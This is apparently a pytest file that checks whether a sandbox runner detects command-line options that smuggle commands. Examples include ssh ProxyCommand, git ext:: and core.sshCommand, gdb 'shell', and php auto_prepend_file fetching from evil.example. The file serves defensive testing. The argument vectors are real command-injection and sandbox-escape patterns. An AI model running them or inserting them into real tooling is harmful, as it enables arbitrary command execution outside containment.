"""Options that carry a command for this host make a command a runner.

Measured before (pre-release security review): core.mcp_runner called
``ssh -o ProxyCommand="sh -c id" x``, ``git ls-remote ext::sh -c id``,
``git -c core.sshCommand=… …``, ``gdb -batch -ex "shell id"`` and
``php -dauto_prepend_file=https://evil.example x.php`` "a program on disk
that runs as it is" - each runs a command or fetched code on the host, and
core.mcp_client's containment rule let them start outside the sandbox.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.mcp_runner import downloading_runner  # noqa: E402


@pytest.mark.parametrize("argv", [
    ["ssh", "-o", "ProxyCommand=sh -c id", "x"],
    ["ssh", "-oProxyCommand sh -c id", "x"],
    ["ssh", "-o", "proxycommand = nc %h %p", "x"],
    ["scp", "-o", "LocalCommand=id", "a", "b:"],
    ["ssh", "-o", "KnownHostsCommand=/bin/sh -c id", "x"],
])
def test_sad_ssh_command_options_are_runners(argv):
    assert downloading_runner(argv) is not None, argv


@pytest.mark.parametrize("argv", [
    ["git", "ls-remote", "ext::sh -c id"],
    ["git", "clone", "ext::sh -c touch% /tmp/pwned", "x"],
    ["git", "-c", "core.sshCommand=sh -c id", "fetch", "origin"],
    ["git", "-c", "alias.x=!sh -c id", "x"],
    ["git", "-c", "protocol.ext.allow=always", "fetch"],
    ["git", "fetch", "--upload-pack=sh -c id", "origin"],
    ["git", "rebase", "--exec", "id", "main"],
])
def test_sad_git_command_options_are_runners(argv):
    assert downloading_runner(argv) is not None, argv


@pytest.mark.parametrize("argv", [
    ["gdb", "-batch", "-ex", "shell id"],
    ["gdb", "--eval-command=shell id"],
    ["gdb", "-iex", "shell id", "./a.out"],
])
def test_sad_gdb_commands_on_the_line_are_runners(argv):
    assert downloading_runner(argv) is not None, argv


@pytest.mark.parametrize("argv", [
    ["php", "-dauto_prepend_file=https://evil.example", "x.php"],
    ["php", "-d", "extension=/tmp/evil.so", "server.php"],
    ["php", "-d", "allow_url_include=1", "server.php"],
])
def test_sad_php_settings_that_load_code_are_runners(argv):
    assert downloading_runner(argv) is not None, argv


@pytest.mark.parametrize("harmless, twin", [
    (["ssh", "-o", "ProxyCommand=none", "-J", "jump", "host"],
     ["ssh", "-o", "ProxyCommand=nc jump 22", "host"]),
    (["ssh", "-o", "StrictHostKeyChecking=no", "host", "uptime"],
     ["ssh", "-o", "LocalCommand=id", "host", "uptime"]),
    (["git", "-c", "user.name=x", "commit", "-m", "y"],
     ["git", "-c", "core.pager=sh -c id", "log"]),
    (["git", "push", "-u", "origin", "main"],
     ["git", "push", "--receive-pack=sh -c id", "origin", "main"]),
    (["gdb", "-batch", "-x", "commands.gdb", "./a.out"],
     ["gdb", "-batch", "-ex", "shell id", "./a.out"]),
    (["php", "-d", "memory_limit=1G", "server.php"],
     ["php", "-d", "auto_append_file=/tmp/x.php", "server.php"]),
])
def test_edge_harmless_options_still_run_as_they_are(harmless, twin):
    """Only the options that carry a command count: their harmless
    neighbours keep running directly."""
    assert downloading_runner(harmless) is None, harmless
    assert downloading_runner(twin) is not None, twin
